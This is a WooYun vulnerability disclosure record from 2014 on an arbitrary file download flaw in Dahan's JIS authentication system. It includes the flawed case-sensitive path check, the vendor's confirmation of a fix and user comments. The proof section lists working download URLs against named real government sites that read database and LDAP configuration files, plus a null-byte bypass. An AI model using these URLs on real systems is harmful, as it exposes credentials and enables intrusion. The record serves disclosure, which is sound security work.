{"id": 4587, "wybug_id": "wooyun-2014-049856", "wybug_title": "大汉版通身份认证JIS系统任意文件下载漏洞", "wybug_corp": "南京大汉网络有限公司", "wybug_author": "wefgod", "wybug_date": "2014-01-26 11:55", "wybug_open_date": "2014-04-26 11:56", "wybug_type": "任意文件遍历/下载", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用", "任意文件读取", "文件操作参数未加过滤", "文件操作不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-26：\t细节向公众公开  简要描述： 大汉版通用登录JIS系统任意文件下载漏洞 详细说明：  界面：\n\njis任意文件下载。至少WIN下一般都可以通杀，个别版本加了权限验证需要登录，但是我觉得只要登录后的身份合适，在win下都通杀的。   漏洞证明：  \nif(strFilePath.indexOf(\"WEB-INF\")!=-1){\t\tLogWriter.debug(\"下载文件不存在!\");\t\tout.println(\"<script>alert('file not exist!');history.back();</script>\");\t\treturn;\t}\t\t//判断文件是否存在\tFile file = new File(strFilePath);\tif (!file.exists() || file.getName().endsWith(\".jsp\")) {\t\tLogWriter.debug(\"下载文件不存在!\");\t\tout.println(\"<script>alert('file not exist!');history.back();</script>\");\t\treturn;\t}\n对大小写敏感的判断在win下根本没用啊http://management.ysx.gov.cn/jis/down.jsp?pathfile=web-inf/config/dbconfig.xml\n\nhttp://ln-n-tax.gov.cn/jis/down.jsp?pathfile=WEB-INF/config/dbconfig.xml\n\nhttp://jis.sdds.gov.cn/jis/down.jsp?pathfile=down.jsp%00\n\nhttp://210.75.196.69/jis/down.jsp?pathfile=portlet/gmail/ldapconf.xml\n\nhttp://leader.beijing.gov.cn/jis/down.jsp?pathfile=portlet/gmail/ldapconf.xml   修复方案：  厂商懂的   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-01-26 12:29 厂商回复： 非常感谢您对大汉产品的关注以及对产品安全方面的指正，涉及问题已在新版本中修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-26 12:03 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  嗯？@疯狗 话说为啥标题被改了好像改的有点点问题？大汉版通  通用？是想改成这样的吗……好像少了一个通啊    \n     2014-01-26 12:27 |    \t\t光刃 \t\t\t( 普通白帽子  |\t\t\t        Rank:200 漏洞数:24        | 萝卜白菜保平安)\t\t \n  继续膜拜。楼主挖洞效率真的很高。    \n     2014-01-26 12:49 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @wefgod 好了    \n     2014-01-26 15:22 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @疯狗 谢谢！    \n     2014-01-26 15:23 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @光刃 没有，今天刚好看见，就提交了……    \n     2014-01-26 22:40 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @疯狗 这好像是叫“大汉版通”，好像狗哥又改少了一个字……    \n     2014-01-27 15:54 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @wefgod 原来是这样。。好了    \n     2014-01-27 23:25 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @疯狗 狗哥还真改过来了啊！非常感谢狗哥的细心！    \n     2014-02-11 11:05 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @wefgod 必须得    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}